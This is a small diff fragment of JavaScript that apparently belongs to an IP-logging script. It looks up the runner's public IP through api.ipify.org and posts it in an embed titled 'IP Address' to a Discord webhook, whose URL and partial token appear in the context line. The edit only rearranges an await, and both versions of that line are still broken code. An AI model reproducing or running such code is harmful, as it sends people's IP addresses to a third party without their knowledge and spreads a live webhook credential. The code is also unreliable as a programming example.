@@ -11,7 +11,7 @@ fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoV
         "embeds": [
             {
                 "title": "IP Address",
-                "description": "```"+ await fetch('https://api.ipify.org?format=json').then(resp => {return resp.json().ip}) + "```",
+                "description": "```"+ (await fetch('https://api.ipify.org?format=json')).then(resp => {return resp.json().ip}) + "```",
                 "color": 16711680
             },
             {   
